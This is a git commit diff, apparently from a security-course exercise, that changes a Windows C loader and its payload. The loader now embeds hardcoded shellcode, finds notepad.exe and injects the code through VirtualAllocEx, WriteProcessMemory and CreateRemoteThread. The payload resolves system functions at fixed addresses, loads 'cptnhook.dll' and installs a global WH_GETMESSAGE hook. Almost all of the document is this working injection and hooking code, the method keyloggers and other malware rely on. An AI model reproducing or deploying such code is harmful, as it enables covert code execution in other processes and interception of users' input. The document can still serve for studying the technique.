aec71241f08bd9a79b88cdee04f190b6f26c6123
Kibarski Jonathan <phenixdoc@gmail.com>
2013-05-14 14:31:42 +0300

    working finally

--- ex4/BasicLoader/BasicLoader.c
+++ ex4/BasicLoader/BasicLoader.c
@@ -2,7 +2,11 @@
 //
 
 #include "stdafx.h"
+#include <direct.h>
 FILE* f;
+
+#define SHELLCODE 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x70, 0x53, 0x56, 0x57, 0xC6, 0x45, 0xF4, 0x48, 0xC6, 0x45, 0xF5, 0x6F, 0xC6, 0x45, 0xF6, 0x6F, 0xC6, 0x45, 0xF7, 0x6B, 0xC6, 0x45, 0xF8, 0x50, 0xC6, 0x45, 0xF9, 0x72, 0xC6, 0x45, 0xFA, 0x6F, 0xC6, 0x45, 0xFB, 0x63, 0xC6, 0x45, 0xFC, 0x00, 0xC6, 0x45, 0xE4, 0x63, 0xC6, 0x45, 0xE5, 0x70, 0xC6, 0x45, 0xE6, 0x74, 0xC6, 0x45, 0xE7, 0x6E, 0xC6, 0x45, 0xE8, 0x68, 0xC6, 0x45, 0xE9, 0x6F, 0xC6, 0x45, 0xEA, 0x6F, 0xC6, 0x45, 0xEB, 0x6B, 0xC6, 0x45, 0xEC, 0x2E, 0xC6, 0x45, 0xED, 0x64, 0xC6, 0x45, 0xEE, 0x6C, 0xC6, 0x45, 0xEF, 0x6C, 0xC6, 0x45, 0xF0, 0x00, 0xC7, 0x45, 0xE0, 0x7B, 0x1D, 0x80, 0x7C, 0xC7, 0x45, 0xDC, 0x30, 0xAE, 0x80, 0x7C, 0xC7, 0x45, 0xD8, 0x11, 0x12, 0x43, 0x7E, 0x8D, 0x45, 0xE4, 0x50, 0xFF, 0x55, 0xE0, 0x83, 0xC4, 0x04, 0x89, 0x45, 0xD0, 0x83, 0x7D, 0xD0, 0x00, 0x75, 0x05, 0x83, 0xC8, 0xFF, 0xEB, 0x3D, 0x8D, 0x45, 0xF4, 0x50, 0x8B, 0x4D, 0xD0, 0x51, 0xFF, 0x55, 0xDC, 0x83, 0xC4, 0x08, 0x89, 0x45, 0xD4, 0x83, 0x7D, 0xD4, 0x00, 0x75, 0x07, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xEB, 0x1F, 0x6A, 0x00, 0x8B, 0x45, 0xD0, 0x50, 0x8B, 0x4D, 0xD4, 0x51, 0x6A, 0x03, 0xFF, 0x55, 0xD8, 0x83, 0xC4, 0x10, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x02, 0xEB, 0xF5, 0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x04, 0x00
+
 BOOL str_ends_with(const char * str, const char * suffix) {
 	size_t str_len;
 	size_t suffix_len;
@@ -71,20 +75,28 @@ DWORD findProcessByName(const char * name) {
 }
 
 int _tmain() {
-	int pid, ret;
+	int pid;
 	HANDLE process;
-	FILE* inject;
-	byte buf[201];
-	size_t bytesRead;
+	byte buf[] = {SHELLCODE};
 	LPVOID address;
 	SIZE_T bytesWritten;
 	BOOL wrote, changed, freeOK;
 	DWORD oldProtect;
 	HANDLE hThread;
+	char path[MAX_PATH];
 	LPTHREAD_START_ROUTINE startRoutine;
 	typedef HHOOK (*HINSTALLER)(HMODULE);
 	typedef BOOL (*HUNINSTALLER)(HHOOK);
 	fopen_s(&f, "c:\\temp.txt", "w");
+	fclose(f);
+
+	_getcwd(path, MAX_PATH);
+	fopen_s(&f, "c:\\temp.txt", "a");
+	fprintf(f, "cwd: %s\n", path);
+	fclose(f);
+
+	fopen_s(&f, "c:\\temp.txt", "a");
+	fprintf(f, "shellcode size: %d\n", sizeof(buf));
 	fclose(f);
 
 	pid = findProcessByName("notepad.exe");
@@ -94,7 +106,8 @@ int _tmain() {
 	fopen_s(&f, "c:\\temp.txt", "a");
 	fprintf(f, "pid: %d\n", pid);
 	fclose(f);
-	process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
+	//process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
+	process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
 	if (process == NULL) {
 		_die("Failed to OpenProcess !", -2);
 	}
@@ -102,24 +115,14 @@ int _tmain() {
 	fprintf(f, "pHandle: %d\n", process);
 	fclose(f);
 
-	inject = NULL;
-	ret =fopen_s(&inject,"C:\\Documents and Settings\\Administrator\\My Documents\\GitHub\\kj-security-ex1\\ex4\\InjectMe.dat","rb");
-	if (0 != ret){
-
-		_die("Failed to open InjectMe !", -3);
-	}
-	bytesRead = fread(buf,1,201,inject);
-	if (201 != bytesRead){
-		_die("Failed to read enough !", -4);
-	}
-	
-	fclose(inject);
-
-	address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	address = VirtualAllocEx(process, NULL, sizeof(buf), MEM_COMMIT, PAGE_READWRITE);
 	if (address == NULL) {
 		CloseHandle(process);
 		_die("Failed to VirtualAllocEx !", -5);
 	}
+	fopen_s(&f, "c:\\temp.txt", "a");
+	fprintf(f, "memory address: %p\n", address);
+	fclose(f);
 
 	bytesWritten = 0;
 	wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
@@ -130,31 +133,36 @@ int _tmain() {
 		_die("Failed to write enough memory !", -7);
 	}
 	oldProtect = 0;
-	changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READWRITE,&oldProtect);
+	changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READ,&oldProtect);
 	if (!changed){
 				int err = GetLastError();
 		fopen_s(&f, "c:\\temp.txt", "a");
 		fprintf(f, "err: %d\n", err);
 		fclose(f);
 		_die("Failed to change permission!", -8);
-
 	}
+	fopen_s(&f, "c:\\temp.txt", "a");
+	fprintf(f, "oldProtect: %x\n", oldProtect);
+	fclose(f);
+
 	#pragma warning(disable:4055) // 'type cast' : from data pointer 'LPVOID' to function pointer 'LPTHREAD_START_ROUTINE'
 	startRoutine = (LPTHREAD_START_ROUTINE)address;
 	hThread = CreateRemoteThread(process,NULL,0,startRoutine,NULL,0,NULL);
 	if (NULL == hThread){
 		_die("Failed to create remote thread !", -9);
 	}
+	fopen_s(&f, "c:\\temp.txt", "a");
+	fprintf(f, "hThread: %x\n", hThread);
+	fclose(f);
 
-	freeOK = VirtualFreeEx(process, address, 0, MEM_RELEASE);
-	if (!freeOK) {
-		CloseHandle(process);
-		_die("Failed to VirtualFreeEx !", -10);
-	}
-
-// TODO
-
+	(void)freeOK;
+	//freeOK = VirtualFreeEx(process, address, 0, MEM_RELEASE);
+	//if (!freeOK) {
+	//	CloseHandle(process);
+	//	_die("Failed to VirtualFreeEx !", -10);
+	//}
 	CloseHandle(process);
+
 /*
 	HMODULE hMod = LoadLibraryA(DLL_FILE_NAME);
 	if (NULL == hMod) {
--- ex4/InjectMe/InjectMe.c
+++ ex4/InjectMe/InjectMe.c
@@ -4,40 +4,38 @@ DWORD WINAPI InjectMe(LPVOID lpParameter){
 	typedef HMODULE(*_LoadLibrary)(LPCSTR);
 	typedef FARPROC(*_GetProcAddress)(HMODULE,LPCSTR);
 	typedef FARPROC(*_SetWindowsHookEx)(int , HOOKPROC, HINSTANCE, DWORD);
+	typedef int(*_MessageBox)(HWND,LPCSTR,LPCSTR,UINT);
 	typedef VOID (*_Sleep)(DWORD);
+	typedef DWORD(*_GetLastError)();
 	char hookProc[] = {'H','o','o','k','P','r','o','c',0};
 	char cpnHook[] = { 'c','p','t','n','h','o','o','k','.','d','l','l',0};
-	_LoadLibrary ll;
-	HMODULE hMod;
-	_GetProcAddress gpa;
-	HOOKPROC installProc;
-	_SetWindowsHookEx swh;
-	_Sleep slp;
-	(void)lpParameter;
 
 	//0x7c801d7b - LoadLibraryA - Skip IAT - kernel32
-	ll = (_LoadLibrary)0x7c801d7b;
+	_LoadLibrary ll = (_LoadLibrary)0x7c801d7b;
+	//0x7c80ae40 - GetProcAddress - Skip IAT - kernel32
+	//_GetProcAddress gpa = (_GetProcAddress)0x7c80ae40;
+	_GetProcAddress gpa = (_GetProcAddress)0x7c80ae30;
+	//0x7e431211 - SetWindowsHookExA - Skip IAT - user32
+	_SetWindowsHookEx swh = (_SetWindowsHookEx)0x7e431211;
+	//0x7c802446 - Sleep - Skip IAT - kernel32
+	//_Sleep slp = (_Sleep)0x7c802446;
+
+	HOOKPROC installProc;
+	HMODULE hMod;
+	(void)lpParameter;
 	hMod = ll(cpnHook);
 	if (NULL == hMod){
 		return (DWORD)-1;
 	}
-
-	//0x7c80ae40 - GetProcAddress - Skip IAT - kernel32
-	//0x7c80ae30
-	gpa = (_GetProcAddress)0x7c80ae40;
-
 	installProc = (HOOKPROC)gpa(hMod,hookProc);
 	if (NULL == installProc){
 		return (DWORD)-2;
 	}
-
-	//0x7e431211 - SetWindowsHookExA - Skip IAT - user32
-	swh = (_SetWindowsHookEx)0x7e431211;
 	swh(WH_GETMESSAGE, installProc, hMod, 0);
-
-	//0x7c802446 - Sleep - Skip IAT - kernel32
-	slp = (_Sleep)0x7c802446;
-	slp(INT_MAX);
+	//slp(0x0FFFFFF);
+	while (TRUE) {
+		(void)0;
+	};
 	return 0;
 }
 int main (){return InjectMe((LPVOID)NULL);}
